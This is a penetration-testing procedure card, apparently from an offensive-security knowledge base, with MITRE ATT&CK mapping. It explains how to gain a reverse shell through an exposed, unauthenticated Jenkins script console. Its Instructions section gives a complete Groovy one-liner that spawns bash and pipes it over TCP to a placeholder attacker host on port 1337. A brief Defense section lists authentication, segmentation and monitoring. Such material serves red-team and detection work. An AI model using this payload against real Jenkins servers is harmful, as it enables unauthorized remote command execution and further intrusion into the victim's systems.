---
id: proc-jenkins-reverse-shell-001
tags:
  - rce
  - jenkins
  - groovy
  - reverse-shell
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Lateral Movement]]'
commands:
  - '[[commands/groovy-reverse-shell]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
  - '[[Exploitation of Remote Services]]'
  - '[[Web Protocols]]'
updated_at: '2025-12-14T17:24:08.291Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[Exploitation of Remote Services]]'
  - '[[Web Protocols]]'
---
# Establish-Reverse-Shell-via-Jenkins-Groovy-Script

## Summary

This procedure uses the Jenkins script console to run a Groovy script that spawns a bash process and creates a bidirectional TCP reverse shell to the attacker's host, providing shell access as the jenkins user.

## Description

Leveraging the RCE capability of the exposed Jenkins console, this injects a custom Groovy script using ProcessBuilder to start bash and Socket for I/O forwarding. It targets Linux-based Jenkins hosts, assuming outbound TCP access to the attacker's IP/port. Outcomes include interactive shell for file access, privilege escalation attempts, or persistence.

## Requirements

1. Unauthenticated access to /jenkins/script
2. Attacker's IP reachable from target (port 1337 open)
3. Target OS supports bash and Java (for Groovy)

## Defense

Defensive measures and detection strategies:

- Enforce Jenkins authentication and disable script console
- Network segmentation to block outbound connections from Jenkins
- Monitor for unusual processes (e.g., ProcessBuilder in logs) and EDR alerts on reverse shells

## Objectives

1. Gain interactive shell access on the target host
2. Escalate from web app to OS-level control
3. Enable post-exploitation activities

## Instructions

### Step 1: Prepare Groovy Script

**Context**: Customize the script with attacker's host and port details.

No command; edit the script to set host="attacker_ip" and port=1337.

> Ensure the target can resolve/connect to the IP.

### Step 2: Execute Script in Console

**Context**: Paste and run the script to initiate the reverse connection.

**Command** ([[commands/groovy-reverse-shell]]):
```groovy
String host="your_server_ip"; int port=1337; String cmd="bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

> The script loops to forward streams; success is confirmed by connection on the listener side.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Exploitation of Remote Services]] Exploitation of Remote Services
- [[Web Protocols]] Web Protocols

### Sub-Techniques


## Commands Used

- [[commands/groovy-reverse-shell]]

## Tools Used


## Tags

- rce
- reverse-shell
